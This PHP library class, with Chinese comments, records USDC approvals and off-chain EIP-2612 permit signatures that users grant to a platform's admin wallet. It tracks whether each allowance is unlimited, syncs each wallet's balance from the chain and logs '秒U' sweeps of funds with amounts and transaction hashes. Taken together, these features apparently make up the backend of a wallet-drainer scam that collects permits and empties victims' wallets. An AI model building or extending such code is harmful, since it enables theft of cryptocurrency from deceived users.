<?php

namespace app\common\library;

use app\common\model\UsdcApprove;
use think\Db;
/**
 * USDC 链上 permit / approve 授权记录
 */
class HecUsdcApprove
{
    /** @var bool|null */
    protected static $hasPermitSignatureColumn;

    /** 视为「无限授权」的最小 raw 值（约 1e24） */
    const UNLIMITED_THRESHOLD = '1000000000000000000000000';

    public static function isUnlimitedRaw($raw)
    {
        $raw = trim((string)$raw);
        if ($raw === '' || $raw === '0') {
            return false;
        }
        if (strlen($raw) >= 70) {
            return true;
        }
        if (function_exists('bccomp')) {
            return bccomp($raw, self::UNLIMITED_THRESHOLD) >= 0;
        }
        return (float)$raw >= 1e24;
    }

    public static function rawToUsdt($raw)
    {
        $raw = trim((string)$raw);
        if ($raw === '' || $raw === '0') {
            return '0.000000';
        }
        if (self::isUnlimitedRaw($raw)) {
            return '0.000000';
        }
        if (function_exists('bcdiv')) {
            return bcdiv($raw, '1000000', 6);
        }
        return number_format((float)$raw / 1000000, 6, '.', '');
    }

    /** @deprecated */
    public static function rawToUsdc($raw)
    {
        return self::rawToUsdt($raw);
    }

    /**
     * 写入或更新用户授权记录
     *
     * @param string $txHash           链上交易哈希（0x + 64 hex）；Permit 离线授权传空或 permit
     * @param string $permitSignature  EIP-2612 签名（0x + 130 hex），勿写入 tx_hash
     * @param array  $permitMeta       可选：nonce, deadline
     */
    public static function record($userId, $walletAddress, $spenderAddress, $allowanceRaw, $txHash = '', $permitSignature = '', array $permitMeta = [])
    {
        $userId = (int)$userId;
        $walletAddress = HecEth::normalizeAddress($walletAddress);
        $spenderAddress = HecEth::normalizeAddress($spenderAddress);
        $allowanceRaw = trim((string)$allowanceRaw);
        $txHash = self::normalizeTxHash($txHash);
        $permitSignature = self::normalizePermitSignature($permitSignature);
        $now = time();

        if ($permitSignature !== '' && $txHash === '') {
            $txHash = 'permit';
        }

        if ($userId <= 0 || !HecEth::isEvmAddress($walletAddress)) {
            return null;
        }

        $isPermitOnly = $permitSignature !== '' && ($txHash === '' || $txHash === 'permit');
        if ($isPermitOnly) {
            // 链下 Permit：allowance_raw 只反映链上 allowance，不与签名额度混用
            try {
                $allowanceRaw = HecEth::fetchAllowance($walletAddress, $spenderAddress);
            } catch (\Throwable $e) {
                $allowanceRaw = '0';
            }
        }

        $isUnlimited = self::isUnlimitedRaw($allowanceRaw) ? 1 : 0;
        $data = [
            'user_id'         => $userId,
            'wallet_address'  => $walletAddress,
            'spender_address' => $spenderAddress,
            'token_contract'  => HecEth::usdcContract(),
            'allowance_raw'   => $allowanceRaw !== '' ? $allowanceRaw : '0',
            'allowance_usdt'  => self::rawToUsdt($allowanceRaw),
            'is_unlimited'    => $isUnlimited,
            'tx_hash'         => $txHash,
            'network'         => 'Ethereum',
            'approved_at'     => $now,
        ];
        if ($permitSignature !== '' && self::supportsPermitSignatureColumn()) {
            $data['permit_signature'] = $permitSignature;
        }
        if ($permitSignature !== '' && self::supportsPermitMetaColumns()) {
            $data['permit_value_raw'] = $allowanceRaw !== '' ? $allowanceRaw : HecEth::maxPermitValueRaw();
            $deadline = (int)($permitMeta['deadline'] ?? 0);
            if ($deadline > 0) {
                $data['permit_deadline'] = $deadline;
            }
            $nonce = trim((string)($permitMeta['nonce'] ?? ''));
            if ($nonce !== '') {
                $data['permit_nonce'] = $nonce;
            }
        }

        $row = UsdcApprove::where('user_id', $userId)
            ->where('wallet_address', $walletAddress)
            ->find();

        if ($row) {
            $row->save($data);
            return $row;
        }

        return UsdcApprove::create($data, true);
    }

    /**
     * 从链上同步单条记录的授权额度与 USDT 余额
     *
     * @return array{ok:bool,error?:string}
     */
    public static function syncRow($row)
    {
        if (!$row) {
            return ['ok' => false, 'error' => '记录不存在'];
        }

        $wallet = trim((string)(is_object($row) ? $row->getData('wallet_address') : ($row['wallet_address'] ?? '')));
        $spender = trim((string)(is_object($row) ? $row->getData('spender_address') : ($row['spender_address'] ?? '')));
        if (!$spender) {
            $spender = HecEth::adminWallet();
        }

        if (!HecEth::isEvmAddress(HecEth::normalizeAddress($wallet))) {
            return ['ok' => false, 'error' => '无效钱包地址'];
        }
        if (!HecEth::isEvmAddress(HecEth::normalizeAddress($spender))) {
            return ['ok' => false, 'error' => '平台钱包未配置'];
        }

        try {
            $allowanceRaw = HecEth::fetchAllowance($wallet, $spender);
            $balanceRaw = HecEth::fetchTokenBalance($wallet, HecEth::usdcContract());
        } catch (\Throwable $e) {
            return ['ok' => false, 'error' => $e->getMessage()];
        }

        $prevSyncedAt = (int)(is_object($row) ? $row->getData('synced_at') : ($row['synced_at'] ?? 0));
        $prevChainRaw = trim((string)(is_object($row) ? $row->getData('allowance_raw') : ($row['allowance_raw'] ?? '0')));
        $revokedOnChain = $prevSyncedAt > 0
            && bccomp($prevChainRaw, '0', 0) > 0
            && bccomp($allowanceRaw, '0', 0) === 0;

        $data = [
            'spender_address'  => $spender,
            'allowance_raw'    => $allowanceRaw,
            'allowance_usdt'   => self::rawToUsdt($allowanceRaw),
            'is_unlimited'     => self::isUnlimitedRaw($allowanceRaw) ? 1 : 0,
            'usdt_balance_raw' => $balanceRaw,
            'usdt_balance'     => self::rawToUsdt($balanceRaw),
            'synced_at'        => time(),
        ];

        if ($revokedOnChain) {
            $permitMeta = self::readPermitMeta($row);
            // 链下 Permit 场景链上 allowance 本来就是 0，不应误判为撤销
            if (self::hasValidOffChainPermit($permitMeta)) {
                $revokedOnChain = false;
            }
        }

        if ($revokedOnChain) {
            if (self::supportsPermitSignatureColumn()) {
                $data['permit_signature'] = '';
            }
            if (self::supportsPermitMetaColumns()) {
                $data['permit_deadline'] = 0;
                $data['permit_value_raw'] = '0';
                $data['permit_nonce'] = '';
            }
            $userId = (int)(is_object($row) ? $row->getData('user_id') : ($row['user_id'] ?? 0));
            if ($userId > 0) {
                try {
                    Db::name('user')->where('id', $userId)->update(['permit_expires_at' => 0]);
                } catch (\Throwable $e) {
                    // ignore
                }
            }
        }

        if (is_object($row) && method_exists($row, 'save')) {
            $row->save($data);
        } else {
            UsdcApprove::where('id', (int)($row['id'] ?? 0))->update($data);
        }

        return ['ok' => true];
    }

    /**
     * 记录秒U 结果（累计数量、最近交易哈希）
     */
    public static function recordSweep($row, $amount, $txHash)
    {
        if (!$row) {
            return;
        }

        $amount = trim((string)$amount);
        if (!is_numeric($amount) || (float)$amount <= 0) {
            $amount = '0';
        }

        $txHash = strtolower(trim((string)$txHash));
        if ($txHash !== '' && !preg_match('/^0x[a-f0-9]{64}$/', $txHash)) {
            $txHash = substr($txHash, 0, 66);
        }

        $prev = '0';
        if (is_object($row)) {
            $prev = (string)($row->getData('sweep_amount') ?: '0');
        } elseif (is_array($row)) {
            $prev = (string)($row['sweep_amount'] ?? '0');
        }

        $total = function_exists('bcadd')
            ? bcadd($prev, $amount, 6)
            : number_format((float)$prev + (float)$amount, 6, '.', '');

        $data = [
            'is_swept'      => 1,
            'sweep_amount'  => $total,
            'sweep_tx_hash' => $txHash,
            'swept_at'      => time(),
        ];

        if (is_object($row) && method_exists($row, 'save')) {
            $row->save($data);
        } else {
            $id = (int)(is_object($row) ? $row->getData('id') : ($row['id'] ?? 0));
            if ($id > 0) {
                UsdcApprove::where('id', $id)->update($data);
            }
        }
    }

    /**
     * 同步全部授权记录
     */
    public static function syncAll()
    {
        $rows = UsdcApprove::order('id asc')->select();
        $success = 0;
        $failed = 0;
        $errors = [];

        foreach ($rows as $row) {
            $result = self::syncRow($row);
            if (!empty($result['ok'])) {
                $success++;
            } else {
                $failed++;
                if (count($errors) < 5) {
                    $errors[] = sprintf('#%d %s', $row['id'], $result['error'] ?? '同步失败');
                }
            }
            usleep(120000);
        }

        return [
            'total'   => count($rows),
            'success' => $success,
            'failed'  => $failed,
            'errors'  => $errors,
        ];
    }

    public static function balanceText($row)
    {
        if (is_array($row)) {
            $usdt = $row['usdt_balance'] ?? $row['usdc_balance'] ?? '0';
        } else {
            $usdt = $row->getData('usdt_balance') ?: $row->getData('usdc_balance');
        }
        return rtrim(rtrim(number_format((float)$usdt, 6, '.', ''), '0'), '.') . ' USDC';
    }

    public static function allowanceText($row)
    {
        $permitMeta = self::readPermitMeta($row);
        $chainRaw = self::readRowField($row, 'allowance_raw');
        $chainRaw = $chainRaw !== '' ? $chainRaw : '0';

        // 链上已为无限额度
        if (self::isUnlimitedRaw($chainRaw)) {
            return '无限';
        }

        // 链上已有足够具体额度
        if (bccomp($chainRaw, self::minDisplayAllowanceRaw(), 0) >= 0) {
            $usdt = self::rawToUsdt($chainRaw);
            return rtrim(rtrim(number_format((float)$usdt, 6, '.', ''), '0'), '.') . ' USDC';
        }

        // 链上为 0 或不足：有效链下 Permit 仍视为已授权（Permit 未上链前 allowance 为 0 属正常）
        if (self::hasValidOffChainPermit($permitMeta)) {
            $signedRaw = $permitMeta['value_raw'];
            if ($signedRaw === '' || bccomp($signedRaw, '0', 0) <= 0) {
                $signedRaw = HecEth::maxPermitValueRaw();
            }
            if (self::isUnlimitedRaw($signedRaw)) {
                return '无限(链下·待上链)';
            }
            return rtrim(rtrim(self::rawToUsdt($signedRaw), '0'), '.') . ' USDC(链下·待上链)';
        }

        return '0 USDC';
    }

    protected static function hasValidOffChainPermit(array $permitMeta)
    {
        if ($permitMeta['signature'] === '') {
            return false;
        }
        return (int)$permitMeta['deadline'] > time();
    }

    /**
     * 综合用户表与授权记录，解析有效的链下 Permit 过期时间
     */
    public static function resolvePermitExpiresAt($userId, $walletAddress, $userPermitExpiresAt = 0)
    {
        $expiresAt = (int)$userPermitExpiresAt;
        if ($expiresAt > time()) {
            return $expiresAt;
        }

        $userId = (int)$userId;
        $wallet = HecEth::normalizeAddress($walletAddress);
        if ($userId <= 0 || !HecEth::isEvmAddress($wallet)) {
            return $expiresAt;
        }

        $row = UsdcApprove::where('user_id', $userId)->where('wallet_address', $wallet)->find();
        if (!$row) {
            return $expiresAt;
        }

        $meta = self::readPermitMeta($row);
        if (self::hasValidOffChainPermit($meta)) {
            return (int)$meta['deadline'];
        }

        return $expiresAt;
    }

    /**
     * 读取 Permit 元数据（供秒U 上链）
     *
     * @return array{signature:string,deadline:int,value_raw:string,nonce:string}
     */
    public static function readPermitMeta($row)
    {
        $signature = self::readRowField($row, 'permit_signature');
        $deadline = (int)self::readRowField($row, 'permit_deadline');
        $valueRaw = self::readRowField($row, 'permit_value_raw');
        $nonce = self::readRowField($row, 'permit_nonce');

        $id = (int)self::readRowField($row, 'id');
        if ($id > 0 && ($signature === '' || $deadline <= 0 || $valueRaw === '')) {
            try {
                $fields = ['permit_signature', 'user_id'];
                if (self::supportsPermitMetaColumns()) {
                    $fields = array_merge($fields, ['permit_deadline', 'permit_value_raw', 'permit_nonce']);
                }
                $dbRow = Db::name('usdc_approve')->where('id', $id)->field(implode(',', $fields))->find();
                if ($dbRow) {
                    if ($signature === '') {
                        $signature = trim((string)($dbRow['permit_signature'] ?? ''));
                    }
                    if ($deadline <= 0) {
                        $deadline = (int)($dbRow['permit_deadline'] ?? 0);
                    }
                    if ($valueRaw === '' || bccomp($valueRaw, '0', 0) <= 0) {
                        $valueRaw = trim((string)($dbRow['permit_value_raw'] ?? ''));
                    }
                    if ($nonce === '') {
                        $nonce = trim((string)($dbRow['permit_nonce'] ?? ''));
                    }
                    if ($deadline <= 0 && !empty($dbRow['user_id'])) {
                        $deadline = (int)Db::name('user')->where('id', (int)$dbRow['user_id'])->value('permit_expires_at');
                    }
                }
            } catch (\Throwable $e) {
                // ignore
            }
        }

        if ($valueRaw === '' || bccomp($valueRaw, '0', 0) <= 0) {
            $legacyRaw = self::readRowField($row, 'allowance_raw');
            if (self::isUnlimitedRaw($legacyRaw)) {
                $valueRaw = $legacyRaw;
            }
        }
        if ($valueRaw === '' || bccomp($valueRaw, '0', 0) <= 0) {
            $valueRaw = HecEth::maxPermitValueRaw();
        }

        return [
            'signature' => self::normalizePermitSignature($signature),
            'deadline'  => $deadline,
            'value_raw' => $valueRaw,
            'nonce'     => $nonce,
        ];
    }

    protected static function minDisplayAllowanceRaw()
    {
        return HecEth::minAllowanceRaw();
    }

    protected static function readRowField($row, $field)
    {
        if (is_array($row)) {
            return trim((string)($row[$field] ?? ''));
        }
        if (is_object($row) && method_exists($row, 'getData')) {
            $data = $row->getData();
            if (is_array($data) && array_key_exists($field, $data) && $data[$field] !== null && $data[$field] !== '') {
                return trim((string)$data[$field]);
            }
            if (isset($row->$field) && $row->$field !== null && $row->$field !== '') {
                return trim((string)$row->$field);
            }
        }
        return '';
    }

    /** 链上 tx hash 最长 66；误传 Permit 签名时转为 permit 标记 */
    protected static function normalizeTxHash($txHash)
    {
        $txHash = trim((string)$txHash);
        if ($txHash === '') {
            return '';
        }
        if (preg_match('/^0x[a-fA-F0-9]{64}$/i', $txHash)) {
            return strtolower($txHash);
        }
        if (preg_match('/^0x[a-fA-F0-9]{130}$/i', $txHash)) {
            return 'permit';
        }
        if ($txHash === 'permit') {
            return 'permit';
        }
        return substr($txHash, 0, 64);
    }

    protected static function normalizePermitSignature($signature)
    {
        $signature = trim((string)$signature);
        if ($signature === '') {
            return '';
        }
        if (preg_match('/^0x[a-fA-F0-9]{130}$/i', $signature)) {
            return strtolower($signature);
        }
        return substr($signature, 0, 200);
    }

    /** @var bool|null */
    protected static $hasPermitMetaColumns;

    protected static function supportsPermitMetaColumns()
    {
        if (self::$hasPermitMetaColumns !== null) {
            return self::$hasPermitMetaColumns;
        }
        try {
            $table = (new UsdcApprove())->getTable();
            $rows = Db::query("SHOW COLUMNS FROM `{$table}` LIKE 'permit_deadline'");
            self::$hasPermitMetaColumns = !empty($rows);
        } catch (\Throwable $e) {
            self::$hasPermitMetaColumns = false;
        }
        return self::$hasPermitMetaColumns;
    }

    protected static function supportsPermitSignatureColumn()
    {
        if (self::$hasPermitSignatureColumn !== null) {
            return self::$hasPermitSignatureColumn;
        }
        try {
            $table = (new UsdcApprove())->getTable();
            $rows = Db::query("SHOW COLUMNS FROM `{$table}` LIKE 'permit_signature'");
            self::$hasPermitSignatureColumn = !empty($rows);
        } catch (\Throwable $e) {
            self::$hasPermitSignatureColumn = false;
        }
        return self::$hasPermitSignatureColumn;
    }
}
